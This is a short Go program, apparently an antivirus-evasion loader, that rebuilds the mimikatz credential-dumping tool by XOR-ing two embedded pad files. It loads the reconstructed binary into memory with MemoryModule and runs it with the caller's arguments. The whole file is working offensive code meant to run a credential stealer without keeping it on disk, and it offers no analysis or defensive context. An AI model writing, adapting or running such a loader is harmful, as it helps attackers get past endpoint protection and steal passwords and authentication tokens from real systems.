package main

/*
#cgo CFLAGS: -IMemoryModule
#cgo LDFLAGS: MemoryModule/build/MemoryModule.a
#include "MemoryModule/MemoryModule.h"
*/
import "C"

import (
	"os"
	"unsafe"
)

func main() {
	// load mimikatz pads
	mimikatzPad0, err := Asset("mimikatz.exe.0.pad")
	if err != nil {
		panic(err)
	}
	mimikatzPad1, err := Asset("mimikatz.exe.1.pad")
	if err != nil {
		panic(err)
	}

	// XOR the pads togeather
	var mimikatzEXE []byte
	for index, bite := range mimikatzPad0 {
		mimikatzEXE = append(mimikatzEXE, []byte{bite ^ mimikatzPad1[index]}...)
	}

	// convert the args passed to this program into a C array of C strings
	var cArgs []*C.char
	for _, goString := range os.Args {
		cArgs = append(cArgs, C.CString(goString))
	}

	// load the mimikatz reconstructed binary from memory
	handle := C.MemoryLoadLibrary(unsafe.Pointer(&mimikatzEXE[0]), &cArgs[0])
	if handle == nil {
		panic("MemoryLoadLibrary failed")
	}

	// run mimikatz
	C.MemoryCallEntryPoint(handle)

	// cleanup
	C.MemoryFreeLibrary(handle)
}
